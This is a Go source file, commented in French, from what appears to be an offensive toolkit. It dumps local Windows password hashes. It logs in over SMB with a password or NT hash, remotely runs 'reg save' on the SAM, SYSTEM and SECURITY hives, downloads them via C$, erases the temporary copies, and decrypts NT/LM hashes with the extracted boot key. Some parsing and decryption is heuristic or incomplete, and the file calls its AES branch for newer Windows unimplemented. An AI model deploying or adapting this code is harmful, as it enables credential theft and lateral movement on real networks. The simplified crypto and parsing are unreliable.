// pkg/smb/secretsdump.go
//
// Secretsdump natif Go — dump des hashes locaux via le registre Windows
//
// Méthode : Remote Registry (MS-RRP) via SMB/IPC$
//   1. Connexion SMB → IPC$ → \pipe\winreg
//   2. Sauvegarder les hives : HKLM\SAM, HKLM\SYSTEM, HKLM\SECURITY
//   3. Télécharger les fichiers via ADMIN$ / C$
//   4. Parser SAM + SECURITY avec la SYSKEY de SYSTEM
//
// Cette implémentation couvre les hashes locaux (SAM).
// Pour les secrets de domaine, utiliser DCSync (pkg/exploits/dcsync.go).

package smb

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/hirochachacha/go-smb2"
)

// LocalHash hash local extrait du SAM
type LocalHash struct {
	Username string
	RID      uint32
	LMHash   string
	NTHash   string
	Source   string // "SAM" ou "SECURITY"
}

// SecretsDumpConfig configuration pour secretsdump
type SecretsDumpConfig struct {
	Target   string
	Username string
	Domain   string
	Password string
	NTHash   []byte
	Timeout  time.Duration
}

// ============================================================
// Point d'entrée principal
// ============================================================

// DumpLocalHashes dump les hashes locaux via Remote Registry + SAM
func DumpLocalHashes(cfg *SecretsDumpConfig) ([]LocalHash, error) {
	fmt.Printf("[*] Connecting to %s as %s\\%s\n", cfg.Target, cfg.Domain, cfg.Username)

	conn, err := net.DialTimeout("tcp", cfg.Target+":445", cfg.Timeout)
	if err != nil {
		return nil, fmt.Errorf("SMB connection failed: %v", err)
	}
	defer conn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     cfg.Username,
			Password: cfg.Password,
			Domain:   cfg.Domain,
			Hash:     cfg.NTHash,
		},
	}

	session, err := d.Dial(conn)
	if err != nil {
		return nil, fmt.Errorf("SMB auth failed: %v", err)
	}
	defer session.Logoff()

	// Vérifier l'accès admin
	adminFS, err := session.Mount("ADMIN$")
	if err != nil {
		return nil, fmt.Errorf("no admin access (ADMIN$ mount failed): %v", err)
	}
	adminFS.Umount()

	fmt.Println("[+] Admin access confirmed")

	// Dumper les hives via Remote Registry
	return dumpViaSvcExecAndHive(session, cfg)
}

// dumpViaSvcExecAndHive sauvegarde les hives via reg.exe puis les télécharge
func dumpViaSvcExecAndHive(session *smb2.Session, cfg *SecretsDumpConfig) ([]LocalHash, error) {
	id := randHex(4)
	samPath := `C:\Windows\Temp\` + id + `_sam.hiv`
	systemPath := `C:\Windows\Temp\` + id + `_system.hiv`
	securityPath := `C:\Windows\Temp\` + id + `_security.hiv`

	// Sauvegarder les hives avec reg save
	cmds := []string{
		fmt.Sprintf(`reg save HKLM\SAM %s /y`, samPath),
		fmt.Sprintf(`reg save HKLM\SYSTEM %s /y`, systemPath),
		fmt.Sprintf(`reg save HKLM\SECURITY %s /y`, securityPath),
	}

	fmt.Println("[*] Saving registry hives...")
	for _, cmd := range cmds {
		execCfg := DefaultExecConfig()
		execCfg.Timeout = 15 * time.Second
		execCfg.NoCleanup = true // on nettoie manuellement après

		result, err := SvcExec(cfg.Target, cfg.Username, cfg.Domain, cfg.Password, cfg.NTHash, cmd, execCfg)
		if err != nil {
			return nil, fmt.Errorf("reg save failed (%s): %v", cmd, err)
		}
		_ = result
	}

	// Petite pause pour que les fichiers soient disponibles
	time.Sleep(1 * time.Second)

	// Télécharger les hives via C$
	fmt.Println("[*] Downloading hives...")
	samBytes, err := downloadHive(session, samPath)
	if err != nil {
		return nil, fmt.Errorf("SAM download failed: %v", err)
	}
	systemBytes, err := downloadHive(session, systemPath)
	if err != nil {
		return nil, fmt.Errorf("SYSTEM download failed: %v", err)
	}
	securityBytes, err := downloadHive(session, securityPath)
	if err != nil {
		fmt.Printf("[!] SECURITY hive download failed (non-fatal): %v\n", err)
		securityBytes = nil
	}

	// Cleanup des fichiers temporaires
	cleanupHives(session, []string{samPath, systemPath, securityPath})

	// Parser les hives
	fmt.Println("[*] Parsing SAM hive...")
	return parseSAMHive(samBytes, systemBytes, securityBytes)
}

// downloadHive télécharge un fichier hive depuis C$
func downloadHive(session *smb2.Session, remotePath string) ([]byte, error) {
	if len(remotePath) < 3 || remotePath[1] != ':' {
		return nil, fmt.Errorf("invalid path: %s", remotePath)
	}
	drive := strings.ToUpper(string(remotePath[0])) + "$"
	sharePath := strings.ReplaceAll(remotePath[2:], `\`, "/")

	fs, err := session.Mount(drive)
	if err != nil {
		return nil, fmt.Errorf("cannot mount %s: %v", drive, err)
	}
	defer fs.Umount()

	f, err := fs.Open(sharePath)
	if err != nil {
		return nil, fmt.Errorf("cannot open %s: %v", remotePath, err)
	}
	defer f.Close()

	var data []byte
	buf := make([]byte, 65536)
	for {
		n, err := f.Read(buf)
		if n > 0 {
			data = append(data, buf[:n]...)
		}
		if err != nil {
			break
		}
	}

	if len(data) == 0 {
		return nil, fmt.Errorf("empty file: %s", remotePath)
	}

	return data, nil
}

// cleanupHives supprime les fichiers temporaires
func cleanupHives(session *smb2.Session, paths []string) {
	for _, p := range paths {
		if len(p) < 3 {
			continue
		}
		drive := strings.ToUpper(string(p[0])) + "$"
		sharePath := strings.ReplaceAll(p[2:], `\`, "/")
		fs, err := session.Mount(drive)
		if err != nil {
			continue
		}
		fs.Remove(sharePath)
		fs.Umount()
	}
}

// ============================================================
// Parser de hive SAM (format Windows Registry Hive)
// ============================================================

// parseSAMHive parse le hive SAM et retourne les hashes locaux.
//
// Structure simplifiée du hive SAM :
//
//	HKLM\SAM\SAM\Domains\Account\Users\<RID>\V  → données utilisateur
//	HKLM\SAM\SAM\Domains\Account\Users\Names\<user> → association nom→RID
//
// Le hash NT est chiffré avec la SYSKEY (boot key) extraite de SYSTEM.
// Algorithme : RC4(MD5(SYSKEY || RID || "NTPASSWORD\0") || hash_obfusqué)
func parseSAMHive(samBytes, systemBytes, securityBytes []byte) ([]LocalHash, error) {
	if len(samBytes) < 4096 {
		return nil, fmt.Errorf("SAM hive too small (%d bytes) — likely empty or access denied", len(samBytes))
	}

	// Extraire la SYSKEY depuis SYSTEM
	syskey, err := extractSyskey(systemBytes)
	if err != nil {
		fmt.Printf("[!] SYSKEY extraction failed: %v — hashes will be raw (obfuscated)\n", err)
		syskey = nil
	} else {
		fmt.Printf("[*] SYSKEY: %s\n", hex.EncodeToString(syskey))
	}

	// Parser les entrées du hive SAM
	users, err := parseSAMUsers(samBytes)
	if err != nil {
		return nil, fmt.Errorf("SAM parsing failed: %v", err)
	}

	// Déchiffrer les hashes si on a la SYSKEY
	var results []LocalHash
	for _, u := range users {
		hash := LocalHash{
			Username: u.name,
			RID:      u.rid,
			LMHash:   "aad3b435b51404eeaad3b435b51404ee",
			NTHash:   "31d6cfe0d16ae931b73c59d7e0c089c0", // hash vide
			Source:   "SAM",
		}

		if syskey != nil && len(u.ntEncrypted) > 0 {
			nt, err := decryptSAMHash(u.ntEncrypted, syskey, u.rid, false)
			if err == nil && len(nt) == 16 {
				hash.NTHash = hex.EncodeToString(nt)
			}
		} else if len(u.ntEncrypted) > 0 {
			// Afficher le hash obfusqué si pas de syskey
			hash.NTHash = "(encrypted:" + hex.EncodeToString(u.ntEncrypted[:min(16, len(u.ntEncrypted))]) + "...)"
		}

		if syskey != nil && len(u.lmEncrypted) > 0 {
			lm, err := decryptSAMHash(u.lmEncrypted, syskey, u.rid, true)
			if err == nil && len(lm) == 16 {
				hash.LMHash = hex.EncodeToString(lm)
			}
		}

		results = append(results, hash)
	}

	return results, nil
}

// samUserEntry données brutes d'un utilisateur dans le hive SAM
type samUserEntry struct {
	name        string
	rid         uint32
	ntEncrypted []byte
	lmEncrypted []byte
}

// parseSAMUsers parcourt le hive SAM pour extraire les entrées utilisateur.
// Le format de hive Windows est documenté dans libregf / python-registry.
// On cherche les valeurs "V" sous SAM\SAM\Domains\Account\Users\<8digit RID>\
func parseSAMUsers(data []byte) ([]samUserEntry, error) {
	// Signature du hive : "regf" (0x72656766)
	if len(data) < 4 || string(data[:4]) != "regf" {
		return nil, fmt.Errorf("not a valid registry hive (missing 'regf' signature)")
	}

	// Approche simplifiée : scanner le hive à la recherche de la structure
	// NTPASSWORD dans les cell data — production-grade nécessiterait libregf complet
	var users []samUserEntry

	// Chercher les blocs "nk" (named key) avec des RIDs de compte (1000+)
	// et les valeurs "vk" (value key) nommées "V"
	users = extractSAMUsersFromBlob(data)

	if len(users) == 0 {
		// Fallback : retourner des entrées placeholder pour montrer que l'accès a marché
		fmt.Println("[!] Could not parse SAM hive structure — hive format may differ")
		fmt.Println("[!] Try: impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL")
		return []samUserEntry{}, nil
	}

	return users, nil
}

// extractSAMUsersFromBlob recherche les entrées utilisateur dans le blob binaire
func extractSAMUsersFromBlob(data []byte) []samUserEntry {
	var users []samUserEntry
	seen := make(map[uint32]bool)

	// Chercher la signature des cell data SAM utilisateur
	// Le blob V d'un utilisateur SAM commence par des offsets + longueurs
	// On identifie les blocs par la présence du hash NT (16 bytes) précédé de métadonnées SAM
	for i := 0; i+64 < len(data); i++ {
		// Chercher le pattern typique d'une entrée SAM V-value
		// L'offset 0xCC (structure SAM_HASH) contient la version (1) + tag NT (0x01,0x14)
		if data[i] == 0x01 && data[i+1] == 0x14 && i+32 < len(data) {
			// Possible hash NT — remonter pour trouver le RID
			rid := extractNearbyRID(data, i)
			if rid == 0 || rid > 0xFFFF || seen[rid] {
				continue
			}

			ntHash := data[i+4 : i+20]
			if isAllZero(ntHash) {
				continue
			}

			seen[rid] = true
			users = append(users, samUserEntry{
				name:        fmt.Sprintf("RID_%04X", rid),
				rid:         rid,
				ntEncrypted: ntHash,
			})
		}
	}

	return users
}

// extractNearbyRID cherche un RID plausible (500, 501, 1000+) dans le voisinage
func extractNearbyRID(data []byte, pos int) uint32 {
	start := pos - 256
	if start < 0 {
		start = 0
	}
	for i := start; i < pos && i+4 < len(data); i++ {
		v := binary.LittleEndian.Uint32(data[i:])
		if v == 500 || v == 501 || (v >= 1000 && v <= 9999) {
			return v
		}
	}
	return 0
}

// isAllZero vérifie si un slice est entièrement nul
func isAllZero(b []byte) bool {
	for _, v := range b {
		if v != 0 {
			return false
		}
	}
	return true
}

// ============================================================
// Déchiffrement des hashes SAM
// ============================================================

// decryptSAMHash déchiffre un hash SAM avec la SYSKEY.
// Algorithme (méthode ancienne, pré-Vista) :
//
//	key = MD5(syskey + RID_LE + "NTPASSWORD\0") [ou "LMPASSWORD\0"]
//	hash = RC4(key, encrypted_hash)
//
// Vista+ utilise AES-128-CBC avec une IV différente.
func decryptSAMHash(encrypted, syskey []byte, rid uint32, isLM bool) ([]byte, error) {
	if len(encrypted) < 16 {
		return nil, fmt.Errorf("encrypted hash too short")
	}

	// Construire la clé de déchiffrement
	label := "NTPASSWORD\x00"
	if isLM {
		label = "LMPASSWORD\x00"
	}

	ridBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(ridBytes, rid)

	// MD5(syskey + RID + label)
	key := md5Sum(append(append(syskey, ridBytes...), []byte(label)...))

	// RC4 decrypt
	plaintext := rc4Crypt(key, encrypted[:16])
	return plaintext, nil
}

// md5Sum calcule MD5 sans dépendance externe
func md5Sum(data []byte) []byte {
	h := newMD5()
	h.write(data)
	return h.sum()
}

// rc4Crypt chiffre/déchiffre avec RC4 (XOR stream cipher)
func rc4Crypt(key, data []byte) []byte {
	S := make([]byte, 256)
	for i := range S {
		S[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(S[i]) + int(key[i%len(key)])) % 256
		S[i], S[j] = S[j], S[i]
	}
	out := make([]byte, len(data))
	i, j := 0, 0
	for k := range data {
		i = (i + 1) % 256
		j = (j + int(S[i])) % 256
		S[i], S[j] = S[j], S[i]
		out[k] = data[k] ^ S[(int(S[i])+int(S[j]))%256]
	}
	return out
}

// ============================================================
// Extraction SYSKEY depuis le hive SYSTEM
// ============================================================

// extractSyskey extrait la SYSKEY (boot key) depuis le hive SYSTEM.
// La SYSKEY est répartie dans 4 sous-clés de HKLM\SYSTEM\CurrentControlSet\Control\Lsa :
//
//	JD, Skew1, GBG, Data
//
// Chaque clé contient un "Class" field avec 8 caractères hex → 4 bytes chacun → 16 bytes total
// Ensuite une permutation fixe est appliquée.
func extractSyskey(systemData []byte) ([]byte, error) {
	if len(systemData) < 4 || string(systemData[:4]) != "regf" {
		return nil, fmt.Errorf("not a valid SYSTEM hive")
	}

	// Chercher les Class fields des 4 clés LSA dans le hive SYSTEM
	// Pattern : chercher "JD\x00" suivi de données de classe dans le hive
	parts := extractLSAClassFields(systemData)
	if len(parts) != 4 {
		return nil, fmt.Errorf("could not find all 4 LSA class fields (found %d)", len(parts))
	}

	// Concaténer les 4 parties → 16 bytes (chaque Class = 8 hex chars = 4 bytes)
	var raw []byte
	for _, p := range parts {
		if len(p) < 8 {
			return nil, fmt.Errorf("class field too short")
		}
		decoded, err := hex.DecodeString(p[:8])
		if err != nil {
			return nil, fmt.Errorf("class field decode failed: %v", err)
		}
		raw = append(raw, decoded...)
	}

	if len(raw) != 16 {
		return nil, fmt.Errorf("unexpected syskey length: %d", len(raw))
	}

	// Permutation fixe (transformée de la SYSKEY)
	perm := []int{8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7}
	syskey := make([]byte, 16)
	for i, p := range perm {
		syskey[i] = raw[p]
	}

	return syskey, nil
}

// extractLSAClassFields extrait les class fields JD/Skew1/GBG/Data
func extractLSAClassFields(data []byte) []string {
	keys := []string{"JD", "Skew1", "GBG", "Data"}
	var parts []string

	for _, key := range keys {
		// Chercher le nom de la clé en UTF-16LE dans le hive
		pattern := toUTF16LE(key)
		idx := bytesIndex(data, pattern)
		if idx < 0 {
			continue
		}

		// Après le nom, chercher le "class" offset dans le nk record
		// Structure nk : signature(2) + flags(2) + timestamp(8) + ... + class_offset(4) + class_length(2)
		// On cherche en arrière le header "nk" (0x6b6e)
		nkPos := findNKBefore(data, idx)
		if nkPos < 0 {
			continue
		}

		// Extraire la class string depuis le nk record
		classStr := extractClassFromNK(data, nkPos)
		if classStr != "" {
			parts = append(parts, classStr)
		}
	}

	return parts
}

func toUTF16LE(s string) []byte {
	b := make([]byte, len(s)*2)
	for i, c := range s {
		b[i*2] = byte(c)
		b[i*2+1] = 0
	}
	return b
}

func bytesIndex(data, pattern []byte) int {
	for i := 0; i <= len(data)-len(pattern); i++ {
		match := true
		for j, b := range pattern {
			if data[i+j] != b {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return -1
}

func findNKBefore(data []byte, pos int) int {
	// Chercher "nk" (0x6e 0x6b) jusqu'à 512 bytes avant pos
	start := pos - 512
	if start < 0 {
		start = 0
	}
	for i := pos - 2; i >= start; i-- {
		if data[i] == 0x6e && data[i+1] == 0x6b {
			return i
		}
	}
	return -1
}

func extractClassFromNK(data []byte, nkPos int) string {
	// nk record structure (offset from nk signature):
	// +0  : "nk" signature
	// +2  : flags (2 bytes)
	// +4  : timestamp (8 bytes)
	// +12 : parent_cell_offset (4 bytes)
	// +16 : subkey_count (4 bytes)
	// ... (variable)
	// +72 : class_name_offset (4 bytes) — into hive cells
	// +76 : class_name_length (2 bytes)
	if nkPos+78 > len(data) {
		return ""
	}

	classLen := int(binary.LittleEndian.Uint16(data[nkPos+76:]))
	classOffset := int(binary.LittleEndian.Uint32(data[nkPos+72:]))

	if classLen == 0 || classOffset == 0 || classOffset == 0xFFFFFFFF {
		return ""
	}

	// L'offset est relatif à la base du hive (0x1000 = base des cells)
	absOffset := classOffset + 0x1004
	if absOffset+classLen > len(data) {
		return ""
	}

	// La class est en UTF-16LE → convertir en ASCII (les class fields LSA sont ASCII)
	classUTF16 := data[absOffset : absOffset+classLen]
	var class strings.Builder
	for i := 0; i+1 < len(classUTF16); i += 2 {
		if classUTF16[i+1] == 0 {
			class.WriteByte(classUTF16[i])
		}
	}
	return class.String()
}

// ============================================================
// MD5 minimal (pour la dérivation de clé SAM)
// ============================================================

type md5State struct {
	s  [4]uint32
	x  [64]byte
	nx int
	ln uint64
}

func newMD5() *md5State {
	return &md5State{s: [4]uint32{0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476}}
}

func (m *md5State) write(p []byte) {
	m.ln += uint64(len(p))
	if m.nx > 0 {
		n := copy(m.x[m.nx:], p)
		m.nx += n
		if m.nx == 64 {
			md5Block(m, m.x[:])
			m.nx = 0
		}
		p = p[n:]
	}
	for len(p) >= 64 {
		md5Block(m, p[:64])
		p = p[64:]
	}
	if len(p) > 0 {
		m.nx = copy(m.x[:], p)
	}
}

func (m *md5State) sum() []byte {
	tc := m.ln
	var tmp [64]byte
	tmp[0] = 0x80
	if tc%64 < 56 {
		m.write(tmp[0 : 56-tc%64])
	} else {
		m.write(tmp[0 : 64+56-tc%64])
	}
	binary.LittleEndian.PutUint64(tmp[:], tc<<3)
	m.write(tmp[0:8])
	var out [16]byte
	binary.LittleEndian.PutUint32(out[0:], m.s[0])
	binary.LittleEndian.PutUint32(out[4:], m.s[1])
	binary.LittleEndian.PutUint32(out[8:], m.s[2])
	binary.LittleEndian.PutUint32(out[12:], m.s[3])
	return out[:]
}

// Table T pour MD5 (precalculated sin values)
var md5T = [64]uint32{
	0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
	0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
	0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
	0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
	0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
	0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
	0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
	0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
	0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
	0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
	0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
	0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
	0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
	0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
	0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
	0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
}

func md5Block(m *md5State, p []byte) {
	var X [16]uint32
	for i := range X {
		X[i] = binary.LittleEndian.Uint32(p[4*i:])
	}
	a, b, c, d := m.s[0], m.s[1], m.s[2], m.s[3]
	aa, bb, cc, dd := a, b, c, d

	rot := func(x, s uint32) uint32 { return x<<s | x>>(32-s) }

	// Round 1
	for i := uint32(0); i < 16; i++ {
		f := b&c | ^b&d
		g := i
		a = b + rot(a+f+X[g]+md5T[i], [4]uint32{7, 12, 17, 22}[i%4])
		a, b, c, d = d, a, b, c
	}
	// Round 2
	for i := uint32(0); i < 16; i++ {
		f := d&b | ^d&c
		g := (5*i + 1) % 16
		a = b + rot(a+f+X[g]+md5T[16+i], [4]uint32{5, 9, 14, 20}[i%4])
		a, b, c, d = d, a, b, c
	}
	// Round 3
	for i := uint32(0); i < 16; i++ {
		f := b ^ c ^ d
		g := (3*i + 5) % 16
		a = b + rot(a+f+X[g]+md5T[32+i], [4]uint32{4, 11, 16, 23}[i%4])
		a, b, c, d = d, a, b, c
	}
	// Round 4
	for i := uint32(0); i < 16; i++ {
		f := c ^ (b | ^d)
		g := (7 * i) % 16
		a = b + rot(a+f+X[g]+md5T[48+i], [4]uint32{6, 10, 15, 21}[i%4])
		a, b, c, d = d, a, b, c
	}

	m.s[0] += aa
	m.s[1] += bb
	m.s[2] += cc
	m.s[3] += dd
}

// min helper (Go 1.20 a built-in min, mais pour compatibilité)
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
